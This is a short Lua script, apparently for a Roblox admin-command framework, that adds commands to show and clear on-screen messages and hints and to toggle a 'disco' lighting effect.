-------------------------------------------------------------------------------------------------------------------------------

-- Command to show a message for a specified amount of seconds
addcommand("message", "message", function(...)
	-- Concatenate all arguments to form the full message, allowing for spaces
	local text = table.concat({...}, " ")

	-- Ensure text is not empty
	if text and text ~= "" then
		local message = Instance.new("Message")
		message.Text = text
		message.Parent = game:GetService("Workspace")
	end
end)

-- Command to close (delete) all messages
addcommand("closemessages", "closemessages", function()
	-- Iterate through all objects in the Workspace
	for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
		-- Check if the object is a Message instance
		if obj:IsA("Message") then
			obj:Destroy()  -- Delete the message
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Command to show a message for a specified amount of seconds
addcommand("hint", "hint", function(...)
	-- Concatenate all arguments to form the full message, allowing for spaces
	local text = table.concat({...}, " ")

	-- Ensure text is not empty
	if text and text ~= "" then
		local message = Instance.new("Hint")
		message.Text = text
		message.Parent = game:GetService("Workspace")
	end
end)

-- Command to close (delete) all messages
addcommand("closehints", "closehints", function()
	-- Iterate through all objects in the Workspace
	for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
		-- Check if the object is a Message instance
		if obj:IsA("Hint") then
			obj:Destroy()  -- Delete the message
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Command to start the disco mode
addcommand("disco", "disco", function()
	if not isDiscoActive then
		savelighting()
		isDiscoActive = true
		task.spawn(startDiscoMode) -- Start the disco mode in a separate thread
	end
end)

-- Command to stop the disco mode
addcommand("undisco", "undisco", function()
	if isDiscoActive then
		isDiscoActive = false
	end
	loadlghting()
end)

-------------------------------------------------------------------------------------------------------------------------------
